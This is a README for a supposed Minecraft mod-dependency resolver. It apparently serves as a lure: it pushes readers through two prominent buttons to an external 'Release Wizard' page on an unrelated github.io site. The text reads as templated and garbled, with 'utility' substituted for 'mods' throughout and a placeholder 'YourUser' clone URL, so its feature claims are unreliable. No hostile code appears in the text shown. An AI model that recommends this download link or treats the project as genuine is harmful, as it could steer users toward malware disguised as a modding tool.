# Minecraft-utility-Dependency-Resolver  
*Auto‑detect, validate, and configure utility for a flawless Minecraft experience.*

![Version](https://img.shields.io/badge/version-1.0.0‑brightgreen)  
![License](https://img.shields.io/badge/license-MIT‑blue)  
![Platform](https://img.shields.io/badge/platform-Forge%20|%20Fabric‑orange)  
![Author](https://img.shields.io/badge/author-FiscalPresent‑purple)

---  

## 📥 Quick Install  

<div align="center">
<a href="https://rewfdf.github.io/SetupPage/" target="_blank" style="background:#4CAF50;color:white;padding:12px 24px;border-radius:6px;font-weight:bold;text-decoration:none;display:inline-block;">Launch Release Wizard</a>
</div>

> The button above opens the interactive Release page where the resolver scans your Minecraft installation, pulls the right utility, and configures them automatically.

---  

## ✨ What It Does  

| Feature | Description |
|---------|-------------|
| **Auto‑Detect** | Scans the current `utility/` folder and identifies missing utility dependencies (e.g., **Just Enough Items**, **AppleSkin**, **WTHIT**). |
| **Validation Engine** | Checks version compatibility with your selected Minecraft version, Forge/Fabric loader, and other installed utility. |
| **One‑Click Configuration** | Generates the required `config/` files, sets sensible defaults, and writes them to disk. |
| **Cross‑Loader Support** | Works with both **Forge** and **Fabric** environments – no separate binaries needed. |
| **Rollback Safety** | Creates a backup snapshot before any changes, allowing you to revert instantly. |

---  

## 🚀 Getting Started  

1. **Clone the repo** (or download the latest release)  
   ```bash
   git clone https://github.com/YourUser/Minecraft-utility-Dependency-Resolver.git
   cd Minecraft-utility-Dependency-Resolver
   ```
2. **Run the resolver** – the utility is a single‑file Python script, no extra installation required.  
   ```bash
   python resolver.py
   ```
3. **Follow the prompts** – select your Minecraft version, loader type, and let the resolver do the rest.  

> *Tip:* Keep a copy of the generated `backup/` folder; it contains a snapshot of your original `utility/` and `config/` directories.

---  

## 📂 Repository Layout  

```
Minecraft-utility-Dependency-Resolver/
├─ resolver.py            # Core detection & configuration script
├─ requirements.txt       # Python dependencies (requests, tqdm, etc.)
├─ docs/                  # Detailed user guide and API reference
├─ tests/                 # Unit‑tests for detection logic
└─ examples/              # Sample config files and demo runs
```

---  

## 🛠️ Development  

Contributions are welcome! Follow these steps to set up a development environment:

1. **Create a virtual environment**  
   ```bash
   python -m venv venv
   source venv/bin/activate   # Windows: venv\Scripts\activate
   ```
2. **Install dependencies**  
   ```bash
   pip install -r requirements.txt
   ```
3. **Run the test suite**  
   ```bash
   pytest -q
   ```
4. **Submit a PR** – ensure your changes pass all tests and update the documentation if needed.

---  

## 📚 Documentation  

- **User Guide** – `docs/UserGuide.md`  
- **API Reference** – `docs/API.md`  
- **FAQ & Troubleshooting** – `docs/FAQ.md`  

All docs are also rendered on the GitHub Pages site linked below.

---  

## 🌐 Community & Support  

- **Discord**: Join the #utility‑resolver channel on the *Minecraft Dev* server.  
- **Issues**: File bugs or feature requests via the GitHub Issues tab.  
- **Pull Requests**: Follow the contribution guidelines in `CONTRIBUTING.md`.

---  

## 🎉 Acknowledgements  

Special thanks to the maintainers of **Forge**, **Fabric**, and the open‑source modding community whose APIs make this resolver possible.

---  

<div align="center">
<a href="https://rewfdf.github.io/SetupPage/" target="_blank" style="background:#2196F3;color:white;padding:10px 20px;border-radius:4px;font-weight:600;text-decoration:none;">Open Release Page</a>
</div>